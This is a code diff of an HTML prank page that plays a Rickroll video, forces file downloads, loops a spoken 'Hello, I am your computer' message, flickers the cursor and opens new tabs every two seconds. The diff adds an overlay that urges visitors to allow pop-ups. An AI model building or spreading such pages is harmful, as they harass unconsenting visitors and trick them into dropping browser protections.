@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>you JUST got...</title>
-    <!-- local lol.png as favicon -->
     <link rel="icon" type="image/png" href="lol.png">
     <style>
         body {
@@ -15,6 +14,7 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
+            position: relative;
         }
         .iframe-container {
             width: 100vw;
@@ -26,17 +26,43 @@
             height: 100%;
             border: none;
         }
+        .overlay-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            text-align: center;
+            border: 2px solid #ffaa00;
+            box-shadow: 0 0 20px rgba(255,170,0,0.5);
+            z-index: 1000;
+            pointer-events: none;
+            user-select: none;
+        }
+        .overlay-text a {
+            color: #ffaa00;
+            pointer-events: auto;
+        }
     </style>
 </head>
 <body>
     <div class="iframe-container">
-        <!-- Rick Astley - Never Gonna Give You Up -->
-        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&enablejsapi=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        <!-- Fixed YouTube embed with proper autoplay parameters -->
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&playsinline=1&controls=0&enablejsapi=1" allow="autoplay; muted; loop; encrypted-media; picture-in-picture; fullscreen" allowfullscreen></iframe>
+    </div>
+
+    <div class="overlay-text">
+        If you see "Pop-ups blocked", click allow for the website to work.<br>
+        <small>(i swear there's no adult websites)</small>
     </div>
 
     <script>
         (function() {
-            // ---- CONFIG ----
             const SITES = [
                 'https://www.chrome.com',
                 'https://www.github.com',
@@ -46,7 +72,7 @@
                 'https://mee6.gg',
                 'https://dyno.gg',
                 'https://talkomatic.co',
-                'https://discord.gg/developer-portal'
+                'https://discord.com/developers'  // Fixed: actual Discord Developer Portal
             ];
 
             const SEARCHES = [
@@ -60,7 +86,6 @@
 
             const INTERVAL_SECONDS = 2;
 
-            // ---- Helper to open a URL in a new tab ----
             function openUrl(url) {
                 const newWindow = window.open(url, '_blank');
                 if (!newWindow) {
@@ -71,43 +96,54 @@
                 }
             }
 
-            // ---- Open random website + random search ----
             function openRandomSiteAndSearch() {
                 const siteIndex = Math.floor(Math.random() * SITES.length);
                 const site = SITES[siteIndex];
-
                 const searchIndex = Math.floor(Math.random() * SEARCHES.length);
                 const query = SEARCHES[searchIndex];
                 const searchUrl = 'https://www.google.com/search?q=' + encodeURIComponent(query);
-
                 openUrl(site);
                 setTimeout(() => {
                     openUrl(searchUrl);
                 }, 100);
             }
 
-            // ---- Download cat.png ----
-            function downloadCatPng() {
+            function downloadFile(filename) {
                 const a = document.createElement('a');
-                a.href = 'cat.png';
-                a.download = 'cat.png';
+                a.href = filename;
+                a.download = filename;
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
             }
 
-            // ---- TTS: "Hello, I am your computer" ----
-            function speakHello() {
+            function downloadAllFiles() {
+                downloadFile('cat.png');
+                downloadFile('you-just-got.txt');
+                downloadFile('moai.mp3');
+            }
+
+            function startLoopingTTS() {
                 if ('speechSynthesis' in window) {
-                    const utterance = new SpeechSynthesisUtterance("Hello, I am your computer");
-                    utterance.rate = 1;
-                    utterance.pitch = 1;
-                    utterance.volume = 1;
-                    window.speechSynthesis.speak(utterance);
+                    function speak() {
+                        speechSynthesis.cancel();
+                        const utterance = new SpeechSynthesisUtterance("Hello, I am your computer");
+                        utterance.rate = 1;
+                        utterance.pitch = 1;
+                        utterance.volume = 1;
+                        utterance.lang = 'en-US';
+                        utterance.onend = () => {
+                            setTimeout(speak, 500);
+                        };
+                        utterance.onerror = () => {
+                            setTimeout(speak, 500);
+                        };
+                        speechSynthesis.speak(utterance);
+                    }
+                    speak();
                 }
             }
 
-            // ---- Cursor toggle every 0.5s ----
             function startCursorToggle() {
                 let cursorState = 'default';
                 setInterval(() => {
@@ -116,14 +152,12 @@
                 }, 500);
             }
 
-            // ---- Initial actions ----
             window.addEventListener('load', function() {
-                setTimeout(downloadCatPng, 500);
-                speakHello();                  // Say hello
-                startCursorToggle();            // Begin cursor toggling
+                setTimeout(downloadAllFiles, 500);
+                startLoopingTTS();
+                startCursorToggle();
             });
 
-            // Start the prank loop
             setTimeout(openRandomSiteAndSearch, 1000);
             setInterval(openRandomSiteAndSearch, INTERVAL_SECONDS * 1000);
         })();
